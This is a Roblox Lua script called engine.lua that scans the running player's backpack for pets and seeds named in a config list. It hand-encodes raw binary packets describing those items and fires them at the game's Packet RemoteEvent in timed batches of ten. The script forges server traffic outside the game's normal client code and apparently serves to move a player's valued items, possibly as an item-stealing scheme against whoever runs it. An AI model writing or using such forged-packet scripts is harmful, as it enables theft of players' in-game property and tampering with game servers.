-- engine.lua
return function(config)
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    -- Use the lists from the config (yo.txt)
    local petSet = {}
    for _, name in ipairs(config.pets or {}) do petSet[name:lower()] = true end
    local seedSet = {}
    for _, name in ipairs(config.seeds or {}) do seedSet[name:lower()] = true end

    local backpack = player:WaitForChild("Backpack", 5)
    if not backpack then return end

    local seedItems = {}
    local petItems = {}
    for _, item in ipairs(backpack:GetChildren()) do
        local mainCategory = item:GetAttribute("MainCategory")
        if mainCategory == "Seed" then
            local seedTool = item:GetAttribute("SeedTool")
            if seedTool and seedSet[seedTool:lower()] then
                table.insert(seedItems, {itemKey = seedTool, count = item:GetAttribute("Count") or 1, category = "Seeds"})
            end
        else
            local petName = item:GetAttribute("Pet")
            local petId = item:GetAttribute("PetId")
            if petName and petSet[petName:lower()] then
                table.insert(petItems, {itemKey = petId or "UnknownID", count = 1, category = "Pets"})
            end
        end
    end

    -- Shuffle pets
    for i = #petItems, 2, -1 do local j = math.random(i); petItems[i], petItems[j] = petItems[j], petItems[i] end

    -- SERIALIZATION & FIRE LOGIC
    local function smartEscape(str)
        local escaped = ""
        for i = 1, #str do
            local char = str:sub(i, i)
            local byteVal = string.byte(char)
            if char == "\\" then escaped = escaped .. "\\\\" elseif char == "\"" then escaped = escaped .. "\\\""
            elseif byteVal >= 32 and byteVal <= 126 then escaped = escaped .. char
            else escaped = escaped .. string.format("\\x%02X", byteVal) end
        end
        return escaped
    end

    local function encodeString(str)
        local sizeByte = string.format("\\x%02X", #str)
        if #str == 11 then sizeByte = "\\v" elseif #str == 7 then sizeByte = "\\a" end
        return "\\v" .. sizeByte .. smartEscape(str)
    end

    local function encodeNumber(num)
        local numByte = string.format("\\x%02X", num)
        if num == 11 then numByte = "\\v" elseif num == 7 then numByte = "\\a" end
        return "\\x05" .. numByte
    end

    local function buildPayloadString(itemList)
        if #itemList == 0 then return nil end
        local bufferString = "!\\x01\\x1C\\x00\\x00\\xC0\\x04\\xD6&\\xF0A\\x1C\\x05"
        for index, item in ipairs(itemList) do
            local indexByte = string.format("\\x%02X", index)
            if index == 11 then indexByte = "\\v" elseif index == 7 then indexByte = "\\a" end
            bufferString = bufferString .. indexByte .. "\\x1C" .. encodeString("ItemKey") .. encodeString(item.itemKey) .. encodeString("Count") .. encodeNumber(item.count) .. encodeString("Category") .. encodeString(item.category) .. "\\x00"
            if index < #itemList then bufferString = bufferString .. "\\x05" end
        end
        return bufferString .. "\\x00\\x00"
    end

    local function firePayloadString(payloadStr)
        local packetEvent = ReplicatedStorage:FindFirstChild("SharedModules") and ReplicatedStorage.SharedModules:FindFirstChild("Packet") and ReplicatedStorage.SharedModules.Packet:FindFirstChild("RemoteEvent")
        if packetEvent then
            local binaryStr = payloadStr:gsub("\\x(%x%x)", function(hex) return string.char(tonumber(hex, 16)) end):gsub("\\v", "\v"):gsub("\\a", "\a"):gsub("\\\\", "\\"):gsub('\\"', '"')
            packetEvent:FireServer(buffer.fromstring(binaryStr))
            return true
        end
        return false
    end

    -- Process Batches
    local petIndex = 1
    local totalPets = #petItems
    local firstBatch = {}
    for _, s in ipairs(seedItems) do table.insert(firstBatch, s) end
    for i = 1, math.min(10, totalPets) do table.insert(firstBatch, petItems[petIndex]); petIndex = petIndex + 1 end
    
    if #firstBatch > 0 then firePayloadString(buildPayloadString(firstBatch)); task.wait(12) end
    while petIndex <= totalPets do
        local chunk = {}
        for i = 1, math.min(10, totalPets - petIndex + 1) do table.insert(chunk, petItems[petIndex]); petIndex = petIndex + 1 end
        firePayloadString(buildPayloadString(chunk)); task.wait(12)
    end
end
